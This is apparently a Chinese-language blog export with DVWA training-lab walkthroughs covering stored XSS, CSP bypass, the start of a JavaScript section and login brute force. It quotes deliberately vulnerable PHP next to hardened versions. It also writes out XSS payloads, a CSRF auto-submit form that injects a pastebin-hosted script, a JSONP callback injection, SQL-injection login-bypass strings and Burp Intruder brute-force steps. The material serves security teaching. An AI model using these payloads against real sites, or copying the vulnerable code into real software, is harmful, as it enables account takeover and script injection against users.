//mysql_close();&#125;?&gt;</code></pre><p>可以看到，这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p><pre><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></pre><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = stripslashes( $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $name = htmlspecialchars( $name );    // Update database    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );    $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>可以看到，impossible级别的代码使用htmlspecialchars函数将message和name中的预定义字符转换成html实体，这样就防止了我们填入标签。而且使用token来防范CSRF攻击，使用PDO技术防御SQL注入，进一步提高了安全性。</p><h1 id="CSP-Bypass（CSP绕过）"><a href="#CSP-Bypass（CSP绕过）" class="headerlink" title="CSP Bypass（CSP绕过）"></a>CSP Bypass（CSP绕过）</h1><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>Content-Security-Policy是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。翻译为中文就是内容安全策略。是为了缓解潜在的跨站脚本问题（XSS），浏览器的扩展程序系统引入了内容安全策略这个概念。原来应对XSS攻击时，主要采用函数过滤、转义输入中的特殊字符、标签、文本来规避攻击。CSP的实质就是白名单制度，开发人员明确告诉客户端，哪些外部资源可以加载和执行。开发者只需要提供配置，实现和执行全部由浏览器完成。</p><p>两种方法可以启用CSP：</p><ol><li>一种是通过HTTP相应头信息的Content-Security-Policy字段；</li><li>另一种是通过网页标签；</li></ol><p>例如：</p><meta http-equiv="Content-Security-Policy" content="script-src  'self'; object-src 'none'; style-src cdn.example.org third-party.org;  child-src https:"><p>以上例子的意思如下：</p><ol><li>script-src脚本：只信任当前域名</li><li>object-src：不信任任何URL，即不加载任何资源</li><li>style-src样式表：只信任<a href="http://cdn.example.org和http//third-party.org">http://cdn.example.org和http://third-party.org</a></li><li>child-src：必须使用HTTPS协议加载。这个已从Web标准中删除，新版本浏览器可能不支持。</li><li>其他资源：没有限制其他资源</li></ol><p>当启用CSP后，不符合CSP的外部资源会被阻止加载。</p><p>为什么要使用CSP呢？</p><p>首先，CSP是一种声明机制，允许Web开发者在其应用程序上指定多个安全限制，由支持的用户代理（浏览器）来负责强制执行。CSP旨在“作为开发人员可以使用的工具，以各种方式保护其应用程序，减轻内容注入漏洞的风险和减少应用程序执行的特权”。当前，CSP还处在快速的发展期，目前正在进行规范中的版本是CSP3，CSP标准由用户代理选择实现。例如，Chrome具有完整的CSP2支持，并且实现了CSP3的大部分工作草案，仅在某些情况下可能会落后于实验中的某些特性，而Mozilla  Firefox和基于WebKit的浏览器则刚刚获得了完整的CSP2支持。在实际使用中，CSP策略在Content-Security-Policy HTTP响应头或元素中提供。</p><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php//script-src脚本：&#39;self&#39;只信任当前域名//信任https://pastebin.com 、example.com code.jquery.com、//https://ssl.google-analytics.com$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // alLows js from self, pastebin.com, jquery and google analytics.header($headerCSP);# https://pastebin.com/raw/R570EE00?&gt;&lt;?phpif (isset ($_POST[&#39;include&#39;])) &#123;$page[ &#39;body&#39; ] .= &quot;    &lt;script src=&#39;&quot; . $_POST[&#39;include&#39;] . &quot;&#39;&gt;&lt;/script&gt;&quot;;&#125;$page[ &#39;body&#39; ] .= &#39;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#39;;</code></pre><p>可以看到被信任的网站有：<a href="https://pastebin.com、example.com、code.jquery.com和https//ssl.google-analytics.com">https://pastebin.com、example.com、code.jquery.com和https://ssl.google-analytics.com</a></p><p>因此，绕过CSP的方法就是，攻击者把恶意代码保存在受信任的网站上，然后把链接发送给需要攻击的用户，用户点击后，达到注入目的。</p><p>可以在New Paste中写下代码，点击create去创建链接</p><p><img src="D:\blog\source_posts\DVWA：XSS\CSP受信任网站.png" alt="CSP受信任网站"></p><p>点击raw形式(原生)来显示</p><p><img src="D:\blog\source_posts\DVWA：XSS\点击raw形式(原生)来显示,.jpg" alt="点击raw形式(原生)来显示,"></p><p>复制链接</p><p><img src="D:\blog\source_posts\DVWA：XSS\复制链接.png" alt="复制链接"></p><p>当然也可以通过CSRF实现攻击，做一个钓鱼网站，通过发送邮件等方式让用户收到链接后，诱惑点击，用户点击后，则被被攻击。例如如下构造一个钓鱼网站</p><pre><code>&lt;form action=&quot; http://127.0.0.1/dvwa/vulnerabilities/csp/&quot; id=&quot;csp&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot;/&gt;&lt;/form&gt;&lt;script&gt;var form = document.getElementById(&quot;csp&quot;);form[0].value=&quot;https://pastebin.com/raw/R570EE00&quot;; form.submit(); &lt;/script&gt;</code></pre><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php//增加了nonce$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;;&quot;;header($headerCSP);// Disable XSS protections so that inline alert boxes will workheader (&quot;X-XSS-Protection: 0&quot;);//如果脚本（例如&lt;script nonce=&quot;r@nd0m&quot;&gt;：）标记包含与CSP标头中指定的随机数匹配的随机数属性，则允许执行内联脚本或CSS 。随机数应为安全的随机字符串，并且不应重复使用。# &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;?&gt;&lt;?phpif (isset ($_POST[&#39;include&#39;])) &#123;$page[ &#39;body&#39; ] .= &quot;    &quot; . $_POST[&#39;include&#39;] . &quot;&quot;;&#125;$page[ &#39;body&#39; ] .= &#39;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#39;;</code></pre><p>http头信息中的script-src的合法来源发生了变化，说明如下</p><ul><li>unsafe-inline，允许使用内联资源，如内联&lt; script&gt;元素，javascript:URL，内联事件处理程序（如onclick）和内联&lt; style&gt;元素。必须包括单引号。</li><li>nonce-source，仅允许特定的内联脚本块，nonce=”TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=”</li></ul><p>现在更加简单了，可以直接输入以下代码</p><p> <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script></p><p>弹出如下信息框，表示注入成功。</p><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><p>high.php</p><pre><code>&lt;?php$headerCSP = "Content-Security-Policy: script-src 'self';";header($headerCSP);?&gt;&lt;?phpif (isset ($_POST['include'])) {$page[ 'body' ] .= "    " . $_POST['include'] . "";}$page[ 'body' ] .= '&lt;form name="csp" method="POST"&gt;    &lt;p&gt;The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;    &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;    &lt;input type="button" id="solve" value="Solve the sum" /&gt;&lt;/form&gt;&lt;script src="source/high.js"&gt;&lt;/script&gt;';</code></pre><p>high.js</p><pre><code>function clickButton() {    var s = document.createElement("script");    s.src = "source/jsonp.php?callback=solveSum";    document.body.appendChild(s);}function solveSum(obj) {    if ("answer" in obj) {        document.getElementById("answer").innerHTML = obj['answer'];    }}var solve_button = document.getElementById ("solve");if (solve_button) {    solve_button.addEventListener("click", function() {        clickButton();    });}</code></pre><p>这个级别已经没有输入框了，不过题目已经给了足够多的提示。</p><p>首先先看一下 CSP 头，发现只有 <code>script-src 'self';，</code> 看来只允许本界面加载的 javascript 执行。</p><p>然后研究了一下这个点击显示答案的逻辑(逻辑在 <code>source/high.js</code>里), 大致如下: 点击按钮  -&gt; js 生成一个 script 标签(src 指向 source/jsonp.php?callback=solveNum),  并把它加入到 DOM 中 -&gt; js 中定义了一个 solveNum 的函数 -&gt; 因此 script 标签会把远程加载的  solveSum({“answer”:”15”}) 当作 js 代码执行, 而这个形式正好就是调用了 solveSum 函数,  然后这个函数就会在界面适当的位置写入答案。</p><p>一般是没办法修改服务器上的 jsonp.php 文件的，但是在查看服务端源码的时，可以看到下面代码:</p><pre><code>if (isset ($_POST['include'])) {$page[ 'body' ] .= "    " . $_POST['include'] . "";}</code></pre><p>jsonp.php</p><pre><code>&lt;?phpheader("Content-Type: application/json; charset=UTF-8");if (array_key_exists ("callback", $_GET)) {    $callback = $_GET['callback'];} else {    return "";}$outp = array ("answer" =&gt; "15");echo $callback . "(".json_encode($outp).")";?&gt;</code></pre><p> callback 参数可以被操控以生成任何你想要得到的结果, 比如 alert, 因此可以构造 Payload: <code>&lt;script src="source/jsonp.php?callback=alert('hacked');"&gt;&lt;/script&gt;</code>, 并把这个当做 include 参数传I给界面就 注入成功!</p><p>或者抓包修改solvesum</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\CSP修改solveSum.png" alt="CSP修改solveSum"></p><p>弹框</p><p><img src="/2021/03/06/dvwa-xss/blog/source_posts\DVWA：XSS\CSP修改solvesum弹框.png" alt="CSP修改solvesum弹框"></p><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><p>impossible.php</p><pre><code>&lt;?php$headerCSP = "Content-Security-Policy: script-src 'self';";header($headerCSP);?&gt;&lt;?phpif (isset ($_POST['include'])) {$page[ 'body' ] .= "    " . $_POST['include'] . "";}$page[ 'body' ] .= '&lt;form name="csp" method="POST"&gt;    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;    &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;    &lt;input type="button" id="solve" value="Solve the sum" /&gt;&lt;/form&gt;&lt;script src="source/impossible.js"&gt;&lt;/script&gt;';</code></pre><p>impossible.js</p><pre><code>function clickButton() {    var s = document.createElement("script");    s.src = "source/jsonp_impossible.php";    document.body.appendChild(s);}function solveSum(obj) {    if ("answer" in obj) {        document.getElementById("answer").innerHTML = obj['answer'];    }}var solve_button = document.getElementById ("solve");if (solve_button) {    solve_button.addEventListener("click", function() {        clickButton();    });}</code></pre><p>jsonp_impossible.php</p><pre><code>&lt;?phpheader("Content-Type: application/json; charset=UTF-8");$outp = array ("answer" =&gt; "15");echo "solveSum (".json_encode($outp).")";?&gt;</code></pre><p>该级别主要还是修复了 callback 参数可被控制问题，无法进行攻击</p><h2 id="JavaScript（JS攻击）"><a href="#JavaScript（JS攻击）" class="headerlink" title="JavaScript（JS攻击）"></a>JavaScript（JS攻击）</h2><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php$page[ 'body' ] .= &lt;&lt;&lt;EOF&lt;script&gt;/*MD5 code from herehttps://github.com/blueimp/JavaScript-MD5*///省略一些函数。。。    function generate_token() {//id为phrase就是input输入框中的值，将该值md5加密后，作为token进行验证        var phrase = document.getElementById("phrase").value;        document.getElementById("token").value = md5(rot13(phrase));    }    generate_token();&lt;/script&gt;EOF;?&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA</title>
      <link href="2021/02/26/dvwa/"/>
      <url>2021/02/26/dvwa/</url>
      
        <content type="html"><![CDATA[<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code>if( isset( $_GET[ 'Login' ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Sanitise username input    $user = $_GET[ 'username' ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input    $pass = $_GET[ 'password' ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Check database    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";</code></pre><p>可以采用暴力破解和SQL注入等方式(这里对admin和password没有过滤)</p><h4 id="法一：burp爆破"><a href="#法一：burp爆破" class="headerlink" title="法一：burp爆破"></a>法一：burp爆破</h4><h5 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1.抓包"></a>1.抓包</h5><h5 id="2-ctrl-I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加"><a href="#2-ctrl-I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加" class="headerlink" title="2.ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$"></a>2.ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$</h5><h5 id="3-选中Payloads，载入字典，点击Start-attack进行爆破"><a href="#3-选中Payloads，载入字典，点击Start-attack进行爆破" class="headerlink" title="3.选中Payloads，载入字典，点击Start attack进行爆破"></a>3.选中Payloads，载入字典，点击Start attack进行爆破</h5><h5 id="4-最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。"><a href="#4-最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。" class="headerlink" title="4.最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。"></a>4.最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</h5><h4 id="法二：SQL注入"><a href="#法二：SQL注入" class="headerlink" title="法二：SQL注入"></a>法二：SQL注入</h4><pre><code>admin’ or ’1′=’1  </code></pre><p>或者</p><pre><code>admin’ #</code></pre><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>此阶段在失败的登录页面上加上了sleep(2)，这意味着当我们输入的用户名或密码错误时，将需要等待额外的两秒钟才能看到错误页面。这只会减少单位时间内可处理的请求数量，从而使暴力破解的时间更长。</p><p>另外，本阶段源码通过mysql-real-escape-string()函数对输入的用户名和密码中的特殊字符进行了转义，以防止sql注入，因此无法使用万能密钥登录。</p><pre><code>&lt;?phpif( isset( $_GET[ 'Login' ] ) ) {    // Sanitise username input    $user = $_GET[ 'username' ];    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input    $pass = $_GET[ 'password' ];    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Check the database    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row["avatar"];        // Login successful        $html .= "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";        $html .= "&lt;img src=\"{$avatar}\" /&gt;";    }    else {        // Login failed        sleep( 2 );        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?&gt;</code></pre><h4 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h4><p>与Low Level中的方法一相同，不再赘述。另外，如果要用户名密码一起爆破，可以将攻击类型改为cluster bomb模式。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_GET[ 'Login' ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Sanitise username input    $user = $_GET[ 'username' ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input    $pass = $_GET[ 'password' ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Check database    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {        // Get users details        $row    = mysqli_fetch_assoc( $result );        $avatar = $row["avatar"];        // Login successful        $html .= "&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;";        $html .= "&lt;img src=\"{$avatar}\" /&gt;";    }    else {        // Login failed        sleep( rand( 0, 3 ) );        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>登录验证提交了四个参数：username、password、user_token、login</p><p>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p><p>源码使用了stripslashes()、 mysql_real_escape_string()对参数username、password进行过滤、转义，进一步抵御sql注入。</p><h4 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a><strong>stripslashes()</strong></h4><p>去除字符串中的反斜线字符，如果有两个连续的反斜线，则只去掉一个。</p><h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h4><p>函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><ul><li><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul></li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><h5 id="错误页面使用了sleep-rand-0-3-，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。"><a href="#错误页面使用了sleep-rand-0-3-，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。" class="headerlink" title="错误页面使用了sleep( rand( 0, 3 ) );，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。"></a>错误页面使用了sleep( rand( 0, 3 ) );，也就是说当我们输入错误的用户名或密码时，会随机等待0-3秒后才显示错误信息。降低了暴力破解的效率。</h5><h4 id="采用burp爆破"><a href="#采用burp爆破" class="headerlink" title="采用burp爆破"></a>采用burp爆破</h4><h5 id="1-抓包，发送到Intruder模块"><a href="#1-抓包，发送到Intruder模块" class="headerlink" title="1.抓包，发送到Intruder模块"></a>1.抓包，发送到Intruder模块</h5><h5 id="2-选择Pitchfork-草叉模式-，添加爆破的参数"><a href="#2-选择Pitchfork-草叉模式-，添加爆破的参数" class="headerlink" title="2.选择Pitchfork(草叉模式)，添加爆破的参数"></a>2.选择Pitchfork(草叉模式)，添加爆破的参数</h5><h5 id="3-在Options中找到Request-Engine模块，把线程数设为1"><a href="#3-在Options中找到Request-Engine模块，把线程数设为1" class="headerlink" title="3.在Options中找到Request Engine模块，把线程数设为1"></a>3.在Options中找到Request Engine模块，把线程数设为1</h5><h5 id="4-在Options中找到Rediections模块，选择always，允许重定向"><a href="#4-在Options中找到Rediections模块，选择always，允许重定向" class="headerlink" title="4.在Options中找到Rediections模块，选择always，允许重定向"></a>4.在Options中找到Rediections模块，选择always，允许重定向</h5><h5 id="5-在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user-token"><a href="#5-在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user-token" class="headerlink" title="5.在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user_token"></a>5.在Options中找到Grep-Extract模块，点击Add，并设置筛选条件，得到user_token</h5><h5 id="6-在Payloads中为选择的参数设置字典"><a href="#6-在Payloads中为选择的参数设置字典" class="headerlink" title="6.在Payloads中为选择的参数设置字典"></a>6.在Payloads中为选择的参数设置字典</h5><h5 id="7-点击start-attack，开始爆破"><a href="#7-点击start-attack，开始爆破" class="headerlink" title="7.点击start attack，开始爆破"></a>7.点击start attack，开始爆破</h5><h5 id="根据返回长度的大小，可以得到正确的用户密码"><a href="#根据返回长度的大小，可以得到正确的用户密码" class="headerlink" title="根据返回长度的大小，可以得到正确的用户密码"></a>根据返回长度的大小，可以得到正确的用户密码</h5><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Login' ] ) &amp;&amp; isset ($_POST['username']) &amp;&amp; isset ($_POST['password']) ) {    // Check Anti-CSRF token---校验token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Sanitise username input----过滤、转义用户输入的username    $user = $_POST[ 'username' ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input----过滤、转义用户输入的password    $pass = $_POST[ 'password' ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Default values    $total_failed_login = 3;    $lockout_time       = 15;    $account_locked     = false;    // Check the database (Check user information)　　 // 用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令    $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );    $data-&gt;execute();    $row = $data-&gt;fetch();    // Check to see if the user has been locked out.----登录失败锁定机制：3次失败，锁定15分钟    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) )  {        // User locked out.  Note, using this method would allow for user enumeration!        //$html .= "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;";        // Calculate when the user would be allowed to login again        $last_login = strtotime( $row[ 'last_login' ] );        $timeout    = $last_login + ($lockout_time * 60);        $timenow    = time();        /*        print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br /&gt;";        print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br /&gt;";        print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br /&gt;";        */        // Check to see if enough time has passed, if it hasn't locked the account        if( $timenow &lt; $timeout ) {            $account_locked = true;            // print "The account is locked&lt;br /&gt;";        }    }    // Check the database (if username matches the password)----尝试登录，PDO机制防御SQL注入    $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR);    $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR );    $data-&gt;execute();    $row = $data-&gt;fetch();    // If its a valid login...    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {        // Get users details        $avatar       = $row[ 'avatar' ];        $failed_login = $row[ 'failed_login' ];        $last_login   = $row[ 'last_login' ];        // Login successful        $html .= "&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;";        $html .= "&lt;img src=\"{$avatar}\" /&gt;";        // Had the account been locked out since last login?        if( $failed_login &gt;= $total_failed_login ) {            $html .= "&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;";            $html .= "&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;";        }        // Reset bad login count        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );        $data-&gt;execute();    } else {        // Login failed----如果登录失败，随机等待2-4秒后再返回错误信息        sleep( rand( 2, 4 ) );        // Give the user some feedback        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;";        // Update bad login count        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );        $data-&gt;execute();    }    // Set the last login time    $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );    $data-&gt;execute();}// Generate Anti-CSRF 